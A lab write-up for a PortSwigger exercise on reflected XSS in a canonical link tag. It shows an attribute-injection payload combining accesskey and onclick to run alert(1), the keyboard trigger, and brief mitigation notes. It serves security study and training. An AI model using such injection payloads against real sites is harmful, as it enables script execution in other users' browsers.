# Lab17 - Reflected XSS Into Canonical Link Tag

## Objective

Exploit a reflected XSS vulnerability where user input is reflected into a:

```html
<link rel="canonical">
```

tag.

Execute:

```javascript
alert(1)
```

using accesskey abuse.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | HTML Attribute |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects attacker-controlled input inside:

```html
<link rel="canonical" href="USER_INPUT">
```

and encodes angle brackets.

Tag injection is not possible.

Attribute injection remains possible.

---

# Analysis

## Step 1

Inspect response.

Observed:

```html
<link rel="canonical"
href="USER_INPUT">
```

---

## Step 2

Determine Context

Input appears inside:

```text
HTML Attribute
```

---

## Step 3

Need Attribute Injection

Goal:

```text
Close Attribute
        ↓
Inject New Attribute
        ↓
Trigger Event
```

---

## Step 4

Use Accesskey

Payload:

```html
'accesskey='x'
onclick='alert(1)
```

---

# Full Payload(s) Used

## Final Payload

```html
'accesskey='x' onclick='alert(1)
```

---

## Trigger

```text
ALT + SHIFT + X
```

(Chrome)

---

# Why The Payload Works

Original:

```html
<link rel="canonical"
href="USER_INPUT">
```

---

Injected:

```html
<link
rel="canonical"
href=''
accesskey='x'
onclick='alert(1)'>
```

---

Execution Flow

```text
Access Key Pressed
        ↓
onclick Triggered
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Observation

Cannot inject tags.

---

## Key Realization

Can inject:

```text
New Attributes
```

inside existing tag.

---

## Exploitation Strategy

Add:

```html
accesskey
```

and

```html
onclick
```

attributes.

---

## Trigger

Press:

```text
ALT + SHIFT + X
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Context-aware output encoding.

Disallow arbitrary attribute injection.

---

# Related Theory

- 24-xss-in-html-tag-attributes.md

---

# Key Learnings

- Canonical tags can still be exploitable.
- Accesskey abuse is a useful XSS technique.
- Attribute injection remains dangerous even when tags are blocked.